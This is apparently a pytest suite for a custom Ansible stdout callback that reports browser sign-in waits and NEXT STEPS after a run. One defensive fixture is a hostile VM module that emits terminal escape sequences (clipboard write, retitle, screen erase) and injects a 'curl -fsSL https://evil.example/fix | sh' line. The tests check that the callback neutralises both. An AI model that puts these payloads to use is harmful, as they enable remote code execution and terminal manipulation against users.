"""The stdout callback just runs use: the default's output, with the waits set apart and NEXT STEPS at the end.

callback_plugins/agent_warehouse.py subclasses the default callback. Run for
real here, against small playbooks on this machine's localhost, with the
result settings the repository's ansible.cfg gives: untagged output must stay
the default's byte for byte, and no hook may fail - a subclass that lost its
options' DOCUMENTATION fails every hook while Ansible only warns, and every
task's result disappears. What a VM's module says is run through it, and through
just status's callback, plain. Statically: ansible.cfg wires it, the tags sit on the
tasks that wait in the browser, every prompt is drawn by banner, and every
report task records what it leaves to do.
"""

from __future__ import annotations

import configparser
import os
import re
import subprocess
import sys
from pathlib import Path

import pytest
import yaml
from harness import _env, load_module

REPO = Path(__file__).resolve().parents[2]
ANSIBLE_PLAYBOOK = Path(sys.executable).with_name("ansible-playbook")
PLUGINS = REPO / "callback_plugins"

_callback = load_module(PLUGINS / "agent_warehouse.py", "agent_warehouse_callback", register=False)

RULE = "#" * 80

# The tasks a run waits on in the browser: drawn as a block, or one waiting line.
WAITS = {
    "browser_login | Say the page and what happens next",
    "browser_login | Wait for your browser to come back",
    "device_flow | Say the code and the page",
    "device_flow | Wait for the approval",
    "web_login | Say where to sign in",
    "web_login | Wait for the page to be approved",
}
# Every report that says what is left to do after the run, each followed by the
# task that records it for NEXT STEPS (docs/architecture/custom-code.md §7.5).
REPORTS = {
    "roles/claude_code/tasks/login.yml": ["login | Report the login state and what to do about it"],
    "roles/claude_code/tasks/browser_login.yml": ["browser_login | Say that nobody answered"],
    "roles/claude_code/tasks/remote_control.yml": [
        "remote_control | Report where to reach the session",
        "remote_control | Say exactly what to run",
    ],
    "roles/github_projects/tasks/auth.yml": [
        "auth | Say that the token only lists",
        "auth | Say that the token only lists beside a login of your own",
        "auth | Say how to sign gh in",
    ],
    "roles/github_projects/tasks/login_report.yml": ["login_report | Report the login state and what to do about it"],
    "roles/github_projects/tasks/clone.yml": ["clone | Say that an organisation gives no git identity"],
    "roles/tailscale/tasks/login.yml": ["login | Say why there is nothing to sign in"],
    "roles/tailscale/tasks/report.yml": ["report | Say how this VM is on Tailscale"],
    "playbooks/claude_login.yml": ["Say why"],
    "playbooks/github_login.yml": ["Say why"],
    "playbooks/tasks/sign_in_failed.yml": ["sign_in_failed | Say why, and go on with the next VM"],
    "playbooks/tasks/sign_in_held.yml": ["sign_in_held | Say why the sign-in was not started"],
    "playbooks/tasks/vm_marks.yml": ["vm_marks | Say each VM whose marks could not be written"],
    "playbooks/code.yml": ["Say how to open each VM", "Say how to open the VM later"],
    "playbooks/tasks/editor_open.yml": ["editor_open | Say what was opened"],
    "playbooks/provision.yml": ["Show each VM and the address it was given"],
    "playbooks/destroy.yml": [
        "Say what became of each VM, and what is left of it",
        "Say which aliases were kept, and why",
    ],
    "playbooks/init_settings.yml": ["Say what was written, and what is left"],
    "playbooks/init_check.yml": ["Say what each check found"],
}

EVERY_KIND = """
- name: Every kind of result
  hosts: localhost
  gather_facts: false
  tasks:
    - name: A message
      ansible.builtin.debug:
        msg: plain
    - name: A change
      ansible.builtin.command: "true"
      changed_when: true
    - name: A skip
      ansible.builtin.debug:
        msg: never
      when: false
    - name: A failure, ignored
      ansible.builtin.command: "false"
      ignore_errors: true
    - name: A loop
      ansible.builtin.debug:
        msg: "{{ item }}"
      loop: [one, two]
    - name: A register
      ansible.builtin.command: echo out
      register: said
      changed_when: false
    - name: The register, printed
      ansible.builtin.debug:
        var: said.stdout_lines
    - name: An untagged retry
      ansible.builtin.command: "true"
      register: tries
      until: tries.attempts | default(0) > 1
      retries: 3
      delay: 0
      changed_when: false
"""


def _config(callback: str, extra_roles: Path | None = None) -> str:
    """The run's ansible.cfg after harness.ANSIBLE_CFG: the result format and callback, as ansible.cfg has them."""
    return f"callback_result_format = yaml\nstdout_callback = {callback}\ncallback_plugins = {PLUGINS}\n" + (
        f"roles_path = {extra_roles}\n" if extra_roles else ""
    )


def _play(root: Path, playbook: str, callback: str = "agent_warehouse", roles: Path | None = None, **env) -> tuple:
    """Run playbook text with callback; stdout, stderr and the run log."""
    (root / "hosts").write_text(f"localhost ansible_connection=local ansible_python_interpreter={sys.executable}\n")
    path = root / "play.yml"
    path.write_text(playbook)
    log = root / "run.log"
    log.unlink(missing_ok=True)
    settings = {"ANSIBLE_LOG_PATH": str(log), **env}
    environment = _env(root, config=_config(callback, roles), **settings)
    if roles:
        environment["ANSIBLE_ROLES_PATH"] = str(roles)
    result = subprocess.run(
        [str(ANSIBLE_PLAYBOOK), "-i", str(root / "hosts"), str(path)],
        cwd=root,
        env=environment,
        stdin=subprocess.DEVNULL,
        capture_output=True,
        text=True,
        timeout=120,
        start_new_session=True,
        check=False,
    )
    assert "Callback dispatch" not in result.stdout + result.stderr, result.stdout + result.stderr
    return result.stdout, result.stderr, log.read_text() if log.exists() else ""


def _masked(output: str) -> str:
    """A run's output with what changes from one run to the next - a command's times - masked."""
    return re.sub(r"(?m)^(\s*(?:start|end|delta): ).*$", r"\1...", output)


def test_untagged_output_is_the_default_callbacks_byte_for_byte(tmp_path):
    # One directory for both: a failure's output names the playbook's path.
    ours, _, _ = _play(tmp_path, EVERY_KIND)
    default, _, _ = _play(tmp_path, EVERY_KIND, "default")
    assert "msg: plain" in ours and "FAILED - RETRYING" in ours and "...ignoring" in ours
    # No NEXT STEPS when nothing was recorded: the default callback, which ours is byte for byte, prints none.
    assert "NEXT STEPS" not in ours
    assert _masked(ours) == _masked(default)


def test_a_browser_message_is_a_block_named_for_its_sign_in(tmp_path):
    roles = tmp_path / "roles"
    tasks = roles / "tailscale" / "tasks"
    tasks.mkdir(parents=True)
    (tasks / "main.yml").write_text(
        "- name: web_login | Say where to sign in\n"
        "  ansible.builtin.debug:\n"
        "    msg: 'localhost: sign in to Tailscale at https://login.tailscale.com/a/x'\n"
        "  tags: [attention_browser]\n"
    )
    out, _, log = _play(
        tmp_path, "- name: Sign in\n  hosts: localhost\n  gather_facts: false\n  roles: [tailscale]\n", roles=roles
    )
    block = (
        f"{RULE}\n##  ACTION REQUIRED IN YOUR BROWSER  -  localhost  -  Tailscale sign-in\n{RULE}\n"
        "localhost: sign in to Tailscale at https://login.tailscale.com/a/x\n"
    )
    assert block in out, out
    assert "ok: [localhost] =>" not in out
    assert "TASK [tailscale : web_login | Say where to sign in]" in out
    assert block in log


def test_a_browser_wait_says_once_that_it_waits_and_an_untagged_one_retries_aloud(tmp_path):
    out, _, _ = _play(
        tmp_path,
        """
- name: Waits
  hosts: localhost
  gather_facts: false
  tasks:
    - name: Wait for the page to be approved
      ansible.builtin.command: "true"
      register: approved
      until: approved.attempts | default(0) > 3
      retries: 5
      delay: 1
      changed_when: false
      tags: [attention_browser]
    - name: Untagged
      ansible.builtin.command: "true"
      register: untagged
      until: untagged.attempts | default(0) > 1
      retries: 3
      delay: 0
      changed_when: false
""",
    )
    # Five runs to come after the first, a second's delay before each: Ansible's "4 retries left" is one short.
    assert out.count("Waiting for you in the browser for localhost (about 5 seconds left; Ctrl-C ends the run)") == 1
    assert "FAILED - RETRYING: [localhost]: Wait for the page to be approved" not in out
    assert "FAILED - RETRYING: [localhost]: Untagged (2 retries left)." in out


def test_next_steps_after_the_recap_by_vm_then_matter_each_line_once(tmp_path):
    out, _, log = _play(
        tmp_path,
        """
- name: Records
  hosts: localhost
  gather_facts: false
  tasks:
    - ansible.builtin.set_stats:
        data:
          github_projects_next: "{{ {'beta': {'github': 'beta: run just login beta --only github'}} }}"
    - ansible.builtin.set_stats:
        data:
          claude_code_next: "{{ {'beta': {'claude': 'beta: run just login beta --only claude'}} }}"
    - ansible.builtin.set_stats:
        data:
          tailscale_next: "{{ {'alpha': {'tailscale': 'alpha: Tailscale is down: sudo tailscale up.'}} }}"
    - ansible.builtin.set_stats:
        data:
          claude_code_next: "{{ {'alpha': {'claude': 'alpha: not signed in. Run just login alpha'}} }}"
    - name: Signed in later in the run
      ansible.builtin.set_stats:
        data:
          claude_code_next: "{{ {'alpha': {'claude': ''}} }}"
    - name: The same line for two matters
      ansible.builtin.set_stats:
        data:
          code_next: "{{ {'beta': {'editor': 'beta: run just login beta --only github'}} }}"
    - name: Under a name nobody reads
      ansible.builtin.set_stats:
        data:
          someone_elses_next: "{{ {'alpha': {'claude': 'not this'}} }}"
""",
    )
    tail = out[out.index("PLAY RECAP") :]
    assert tail.index("localhost") < tail.index("NEXT STEPS")
    assert (
        f"{RULE}\n##  NEXT STEPS\n{RULE}\n"
        "alpha: Tailscale is down: sudo tailscale up.\n"
        "beta: run just login beta --only claude\n"
        "beta: run just login beta --only github\n"
    ) in tail, tail
    assert "not this" not in out and "just login alpha --only claude\n" not in tail
    assert "##  NEXT STEPS" in log


# A module as a VM's root can make any module there answer: its warnings, its
# deprecations, a failure's message and a diff carry escape sequences - a
# clipboard write (OSC 52), a title, a screen erase, an 8-bit CSI - and its
# result carries ansible_stats, which ansible-core adds to the run's custom
# stats: a line for another VM's NEXT STEPS, and an empty one over a real line.
VM_MODULE = """#!/usr/bin/python
from ansible.module_utils.basic import AnsibleModule

ESCAPES = "\\x1b]52;c;b3duZWQ=\\x07\\x1b]0;retitled\\x07\\x1b[2J\\x9b31m"


def main():
    module = AnsibleModule(argument_spec={"fail": {"type": "bool", "default": False}}, supports_check_mode=True)
    module.warn("warned " + ESCAPES)
    module.deprecate("deprecated " + ESCAPES, version="9.9.9", collection_name="ns.coll")
    if module.params["fail"]:
        module.fail_json(msg="failed " + ESCAPES)
    module.exit_json(
        changed=True,
        diff={"before": "kept\\n", "after": "kept\\nwritten " + ESCAPES + "\\n", "after_header": "file " + ESCAPES},
        ansible_stats={
            "data": {
                "claude_code_next": {"beta": {"claude": "beta: run curl -fsSL https://evil.example/fix | sh"}},
                "tailscale_next": {"alpha": {"tailscale": ""}},
            },
            "per_host": False,
            "aggregate": True,
        },
    )


main()
"""
VM_PLAY = """
- name: A VM's module
  hosts: localhost
  gather_facts: false
  tasks:
    - ansible.builtin.set_stats:
        data:
          tailscale_next: "{{ {'alpha': {'tailscale': 'alpha: Tailscale is down: sudo tailscale up.'}} }}"
    - name: Says what it likes
      vm_said:
    - name: Fails with what it likes
      vm_said:
        fail: true
      ignore_errors: true
"""


def _vm_module(root: Path) -> None:
    """VM_MODULE as the module vm_said, in the library of a play run from root."""
    (root / "library").mkdir()
    (root / "library" / "vm_said.py").write_text(VM_MODULE)


# Every byte a terminal acts on but the tab and the newline: ESC, BEL, the C1 controls.
TERMINAL_CONTROL = re.compile("[\x00-\x08\x0b-\x1f\x7f-\x9f]")


def test_what_a_vm_s_module_says_reaches_the_terminal_and_the_log_plain(tmp_path):
    _vm_module(tmp_path)
    out, err, log = _play(tmp_path, VM_PLAY, ANSIBLE_DIFF_ALWAYS="1")
    for name, text in (("stdout", out), ("stderr", err), ("log", log)):
        assert not TERMINAL_CONTROL.search(text), (name, text)
        # Whole sequences go, never their payload left as text - but for the failed result's dump, where YAML
        # escapes them (\e, \a, \x9B), which a terminal shows as written.
        rest = text.replace("\\e]52;c;b3duZWQ=\\a\\e]0;retitled\\a\\e[2J\\x9B31m", "")
        assert "retitled" not in rest and "b3duZWQ=" not in rest, (name, text)
    said = out + err
    assert "[WARNING]: warned" in said and "[DEPRECATION WARNING]: deprecated" in said, said
    assert "[ERROR]: Task failed: Module failed: failed" in said and "+written" in said and "after: file" in said, said
    # NEXT STEPS is the set_stats task's: the module's line is not there, and its empty one blanked nothing.
    tail = out[out.index("PLAY RECAP") :]
    assert f"{RULE}\n##  NEXT STEPS\n{RULE}\nalpha: Tailscale is down: sudo tailscale up.\n" in tail, tail
    assert "evil.example" not in tail, tail


def test_just_status_s_callback_shows_what_a_vm_s_module_says_plain_too(tmp_path):
    # Run for real, as just status's run is: its own test of the hook sets the result the summaries are read from by
    # hand, and would still pass if ansible-core stopped setting it.
    _vm_module(tmp_path)
    out, err, log = _play(tmp_path, VM_PLAY, "agent_warehouse_status")
    for name, text in (("stdout", out), ("stderr", err), ("log", log)):
        assert not TERMINAL_CONTROL.search(text), (name, text)
        assert "retitled" not in text and "b3duZWQ=" not in text, (name, text)
    said = out + err
    assert "[WARNING]: warned" in said and "[DEPRECATION WARNING]: deprecated" in said, said


def test_a_module_s_ansible_stats_do_reach_the_run_s_custom_stats(tmp_path):
    # Why NEXT STEPS reads the set_stats tasks' own results: the default callback,
    # showing the run's custom stats, shows the module's line among them.
    _vm_module(tmp_path)
    out, _, _ = _play(tmp_path, VM_PLAY, "default", ANSIBLE_SHOW_CUSTOM_STATS="1")
    assert "evil.example" in out[out.index("PLAY RECAP") :], out


PROBE = """import os
with open(os.environ["PROBE_LOG"], "a") as log:
    log.write(f"{os.getpid()}\\n")


class FilterModule:
    def filters(self):
        return {"probe": lambda value: value}
"""
PROBE_PLAY = """
- name: Tasks that each template a filter
  hosts: localhost
  gather_facts: false
  tasks:
""" + "".join(
    f"    - name: Task {n}\n      ansible.builtin.debug:\n        msg: '{{{{ {n} | probe }}}}'\n" for n in range(8)
)


@pytest.mark.parametrize("callback", ["agent_warehouse", "agent_warehouse_status"])
def test_the_callback_looks_up_a_filter_before_the_first_worker_so_filter_files_run_once(tmp_path, callback):
    # Each worker would otherwise execute every file in filter_plugins/ at its first lookup, task by task: a few
    # milliseconds each time. A probe file beside them says each process that executed it.
    probe = tmp_path / "probe"
    probe.mkdir()
    (probe / "probe.py").write_text(PROBE)
    log = tmp_path / "probe.log"
    filters = f"{REPO / 'filter_plugins'}{os.pathsep}{probe}"
    _play(tmp_path, PROBE_PLAY, callback, ANSIBLE_FILTER_PLUGINS=filters, PROBE_LOG=str(log))
    assert len(set(log.read_text().split())) == 1, log.read_text()


def test_colour_on_the_screen_never_in_the_log(tmp_path):
    out, _, log = _play(
        tmp_path,
        """
- name: Records
  hosts: localhost
  gather_facts: false
  tasks:
    - ansible.builtin.set_stats:
        data:
          claude_vm_next: "{{ {'alpha': {'vm': 'alpha is stopped: just deploy alpha'}} }}"
""",
        ANSIBLE_NOCOLOR="0",
        ANSIBLE_FORCE_COLOR="1",
    )
    assert re.search(r"\x1b\[[0-9;]*m##  NEXT STEPS", out), out
    assert "##  NEXT STEPS" in log and "\x1b" not in log


@pytest.mark.parametrize(
    ("records", "lines"),
    [
        ({}, []),
        ({"claude_code_next": {"a": {"claude": ""}}}, []),
        (
            {
                "claude_vm_next": {"b": {"destroy": "b left"}, "a": {"vm": "a stopped"}},
                "tailscale_next": {"a": {"tailscale": "a ts"}},
                "claude_code_next": {"a": {"remote_control": "a rc", "claude": "a claude"}},
            },
            ["a stopped", "a claude", "a rc", "a ts", "b left"],
        ),
        # Not a record: ignored, never a failure at the end of the run.
        ({"github_projects_next": {"a": "flat", "b": {"github": 3}}}, []),
        ({"code_next": {"a": {"something_new": "new", "editor": "open"}}}, ["open", "new"]),
        # just init's, the settings' before the checks'.
        ({"claude_vm_next": {"just init": {"init_check": "deploy", "init_settings": "set"}}}, ["set", "deploy"]),
    ],
)
def test_next_steps_reads_the_five_records(records, lines):
    assert _callback.next_steps(records) == lines


def test_ansible_cfg_wires_the_callback_and_nothing_else_does():
    config = configparser.ConfigParser()
    config.read(REPO / "ansible.cfg")
    assert config["defaults"]["stdout_callback"] == "agent_warehouse"
    assert (REPO / config["defaults"]["callback_plugins"] / "agent_warehouse.py").is_file()
    assert _callback.CallbackModule.CALLBACK_NAME == "agent_warehouse"


def _task_lists(node):
    """Every list of tasks in a parsed task file or playbook, blocks and plays included."""
    if isinstance(node, list):
        if all(isinstance(item, dict) for item in node):
            yield node
        for item in node:
            yield from _task_lists(item)
    elif isinstance(node, dict):
        for key in ("tasks", "pre_tasks", "post_tasks", "handlers", "block", "rescue", "always"):
            if isinstance(node.get(key), list):
                yield from _task_lists(node[key])


def _files():
    return sorted(
        [
            *REPO.glob("roles/*/tasks/*.yml"),
            *REPO.glob("playbooks/*.yml"),
            *REPO.glob("playbooks/tasks/*.yml"),
            REPO / "deploy.yml",
        ]
    )


def _tasks(path: Path):
    for tasks in _task_lists(yaml.safe_load(path.read_text())):
        yield from tasks


def test_the_browser_waits_and_only_they_carry_the_tag_and_none_loops():
    tagged = {}
    for path in _files():
        for task in _tasks(path):
            if _callback.WAITING_TAG in (task.get("tags") or []):
                tagged[task["name"]] = task
    assert set(tagged) == WAITS
    assert not [name for name, task in tagged.items() if "loop" in task or any(k.startswith("with_") for k in task)]


def test_every_prompt_is_drawn_by_banner():
    prompts = []
    for path in _files():
        parsed = yaml.safe_load(path.read_text())
        for play in parsed if isinstance(parsed, list) else []:
            if isinstance(play, dict):
                prompts += [entry["prompt"] for entry in play.get("vars_prompt") or []]
        prompts += [task["ansible.builtin.pause"]["prompt"] for task in _tasks(path) if "ansible.builtin.pause" in task]
    assert len(prompts) == 7
    assert all("| banner(" in prompt for prompt in prompts), prompts


# The one stat a record names by a template: the sign-in's, in the task files the three sign-in playbooks share.
SIGN_IN_STAT = "{{ claude_vm_sign_in_stats[claude_vm_sign_in] }}"


def _sign_in_stats(record: dict, stat: str) -> bool:
    """Whether a record's stat is the sign-in's, chosen from a map written out on the record itself, each of whose
    stats is one of the five: whatever the sign-in, its line goes under one of them, or the record fails to run."""
    stats = (record.get("vars") or {}).get("claude_vm_sign_in_stats")
    return (
        stat == SIGN_IN_STAT
        and isinstance(stats, dict)
        and len(stats) > 0
        and all(isinstance(name, str) and name in _callback.NEXT_STATS for name in stats.values())
    )


def test_every_report_is_followed_by_its_record_under_one_of_the_five_names():
    followed, borrowed = {}, []
    for relative, names in REPORTS.items():
        for tasks in _task_lists(yaml.safe_load((REPO / relative).read_text())):
            for index, task in enumerate(tasks):
                if task.get("name") in names:
                    after = tasks[index + 1] if index + 1 < len(tasks) else {}
                    followed[(relative, task["name"])] = "ansible.builtin.set_stats" in after
                    # A report's task vars are its own: a record whose condition named
                    # one failed every just destroy at its end.
                    condition = (
                        " ".join(map(str, after.get("when") or []))
                        if isinstance(after.get("when"), list)
                        else str(after.get("when") or "")
                    )
                    borrowed += [
                        (relative, name) for name in task.get("vars") or {} if re.search(rf"\b{name}\b", condition)
                    ]
    assert borrowed == []
    assert followed == {(relative, name): True for relative, names in REPORTS.items() for name in names}
    records = [task for path in _files() for task in _tasks(path) if "ansible.builtin.set_stats" in task]
    assert len(records) == sum(len(names) for names in REPORTS.values()) == 24
    for record in records:
        data = record["ansible.builtin.set_stats"]["data"]
        assert len(data) == 1, record
        (stat,) = data
        assert stat in _callback.NEXT_STATS or _sign_in_stats(record, stat), record


def _hidden(node) -> bool:
    """Whether a task, block or play sets no_log: anything but false, a template included, since it may be true."""
    value = node.get("no_log", False)
    return value is not False and str(value).strip().lower() not in ("false", "no", "0")


def _records_under_no_log():
    """Every set_stats task that runs under no_log - its own, or a block's, play's, import's, include's or role's
    above it - followed from each playbook through every task file and role it reaches."""
    found, walked = set(), set()

    def walk_file(path: Path, hidden: bool) -> None:
        assert path.is_file(), path
        if (path, hidden) not in walked:
            walked.add((path, hidden))
            walk_tasks(path, yaml.safe_load(path.read_text()) or [], hidden)

    def walk_tasks(path: Path, tasks: list, hidden: bool) -> None:
        for task in tasks:
            here = hidden or _hidden(task)
            for key in ("block", "rescue", "always"):
                walk_tasks(path, task.get(key) or [], here)
            if "ansible.builtin.set_stats" in task and here:
                found.add((str(path.relative_to(REPO)), task.get("name")))
            for module in ("ansible.builtin.import_tasks", "ansible.builtin.include_tasks"):
                if module in task:
                    target = task[module]
                    walk_file(path.parent / (target["file"] if isinstance(target, dict) else target), here)
            for module in ("ansible.builtin.import_role", "ansible.builtin.include_role"):
                if module in task:
                    role = task[module]
                    entry = role.get("tasks_from", "main")
                    walk_file(REPO / "roles" / role["name"] / "tasks" / f"{entry}.yml", here)

    for playbook in [REPO / "deploy.yml", *REPO.glob("playbooks/*.yml")]:
        for play in yaml.safe_load(playbook.read_text()) or []:
            if "ansible.builtin.import_playbook" in play:
                continue  # its plays are walked from their own file
            hidden = _hidden(play)
            for key in ("pre_tasks", "tasks", "post_tasks", "handlers"):
                walk_tasks(playbook, play.get(key) or [], hidden)
            for role in play.get("roles") or []:
                if isinstance(role, str):
                    walk_file(REPO / "roles" / role / "tasks" / "main.yml", hidden)
                else:
                    name = role.get("role", role.get("name"))
                    walk_file(REPO / "roles" / name / "tasks" / "main.yml", hidden or _hidden(role))
    for path in _files():
        walk_file(path, False)
    return found


def test_no_record_runs_under_no_log():
    # The callback reads a record from its set_stats task's own result, which no_log censors: under it, the record
    # is still in the run's custom stats, but its NEXT STEPS line is gone without a word.
    assert _records_under_no_log() == set()


def test_the_no_log_walk_finds_a_record_hidden_from_above(tmp_path, monkeypatch):
    tasks = tmp_path / "playbooks" / "tasks"
    tasks.mkdir(parents=True)
    (tasks / "report.yml").write_text(
        "- name: report | Record it\n  ansible.builtin.set_stats:\n    data: {claude_code_next: {}}\n"
    )
    (tmp_path / "playbooks" / "hidden.yml").write_text(
        "- hosts: localhost\n  tasks:\n    - name: A block\n      no_log: true\n      block:\n"
        "        - name: Import\n          ansible.builtin.import_tasks: tasks/report.yml\n"
    )
    (tmp_path / "deploy.yml").write_text("[]\n")
    monkeypatch.setattr(sys.modules[__name__], "REPO", tmp_path)
    assert _records_under_no_log() == {("playbooks/tasks/report.yml", "report | Record it")}
